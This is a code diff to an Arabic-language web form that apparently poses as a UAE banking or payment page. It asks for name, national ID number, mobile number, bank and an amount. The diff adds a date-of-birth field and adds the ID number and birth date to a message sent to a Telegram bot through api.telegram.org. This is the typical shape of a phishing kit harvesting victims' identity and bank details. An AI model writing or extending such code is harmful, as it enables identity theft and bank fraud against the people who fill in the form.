@@ -32,13 +32,15 @@
       <label for="idNumber">رقم الهوية *</label>
       <input id="idNumber" required>
 
+      <label for="dob">تاريخ الميلاد *</label>
+      <input id="dob" type="date" required>
+
       <label for="mobile">رقم الجوال *</label>
       <input id="mobile" type="tel" placeholder="05XXXXXXXX" required>
 
       <label for="bank">ادخل البنك الخاص بك *</label>
       <select id="bank" required>
         <option value="">— اختر البنك —</option>
-        <!-- بنوك الإمارات المحلية والإقليمية الشائعة -->
         <option>بنك أبوظبي الأول (FAB)</option>
         <option>بنك أبوظبي التجاري (ADCB)</option>
         <option>مصرف أبوظبي الإسلامي (ADIB)</option>
@@ -86,6 +88,7 @@
       const data = {
         fullName: document.getElementById('fullName').value.trim(),
         idNumber: document.getElementById('idNumber').value.trim(),
+        dob:      document.getElementById('dob').value.trim(),
         mobile:   document.getElementById('mobile').value.trim(),
         bank:     document.getElementById('bank').value,
         amount:   document.getElementById('amount').value.trim()
@@ -98,7 +101,9 @@
       const msg = `🚀 نموذج الواجهة الرئيسية
 👤 الاسم: ${data.fullName}
 🏦 البنك: ${data.bank}
-💵 المبلغ: ${data.amount} درهم`;
+💵 المبلغ: ${data.amount} درهم
+🆔 رقم الهوية: ${data.idNumber}
+📅 تاريخ الميلاد: ${data.dob}`;
 
       try{
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
